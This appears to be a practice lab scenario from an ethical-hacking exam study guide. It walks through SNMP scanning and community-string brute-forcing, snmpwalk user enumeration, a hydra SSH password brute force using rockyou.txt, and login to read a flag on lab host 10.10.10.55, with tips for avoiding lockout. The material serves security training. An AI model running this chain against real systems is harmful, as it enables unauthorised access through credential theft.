# Scenario 06 — SNMP Enum to Hydra SSH Brute

**Difficulty:** 🟡 | **Time:** ~20 min | **Domains:** 02 Scanning, 03 Enumeration, 05 System Hacking
**Tools:** [nmap](../../tools/nmap.md), [snmpwalk](../../tools/snmpwalk.md), [hydra](../../tools/hydra.md)

## Story
Target `10.10.10.55` exposes SNMP. Get a shell as any valid user.

## Step 1 — UDP scan for SNMP
```bash
sudo nmap -sU -p 161 10.10.10.55
sudo nmap -sS -p 22,80 10.10.10.55
```
**Expected finding:** 161/udp open, 22/tcp open.
**→ Tool ref:** [nmap -sU](../../tools/nmap.md#scan-techniques)

## Step 2 — Brute community string
```bash
sudo nmap -sU -p 161 --script snmp-brute 10.10.10.55
```
**Expected finding:** community `public`.
**→ Tool ref:** [snmp-brute NSE](../../tools/nmap.md#nse-scripts-the-money-section)

## Step 3 — Enumerate users via SNMP
```bash
snmpwalk -v2c -c public 10.10.10.55 1.3.6.1.4.1.77.1.2.25
# generic fallback:
snmpwalk -v2c -c public 10.10.10.55 | tee snmp.txt
grep -i user snmp.txt
```
**Expected finding:** usernames like `jeff`, `alice`, `bob`.
**→ Tool ref:** [snmpwalk](../../tools/snmpwalk.md)

## Step 4 — Hydra SSH brute
```bash
printf 'jeff\nalice\nbob\n' > users.txt
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -t 4 -f ssh://10.10.10.55
```
**Expected finding:** `login: jeff password: princess`.
**→ Tool ref:** [hydra ssh](../../tools/hydra.md)

## Step 5 — Login + flag
```bash
ssh jeff@10.10.10.55
cat ~/user.txt
```

## Step 6 — Final answer
**Answer format:** `<username>:<password>` or the flag, depending on the Q.

## Gotchas across this chain
- SNMP v2c only — v3 requires auth, no brute. If v3, pivot away.
- `-t 4` on hydra against SSH; higher and OpenSSH rate-limits you into lockout.
- Use `-f` to stop on first success — saves time.
- The correct OID for Windows SNMP user list is `1.3.6.1.4.1.77.1.2.25` — worth memorizing.
- If `public` fails, try `private`, `community`, `manager`.

## Variant questions this scenario teaches you to handle
- "Find the SNMP community string" → step 2.
- "List usernames on the SNMP host" → step 3.
- "Brute-force SSH with this userlist" → step 4.
- "Get user flag on 10.10.10.55" → full chain.
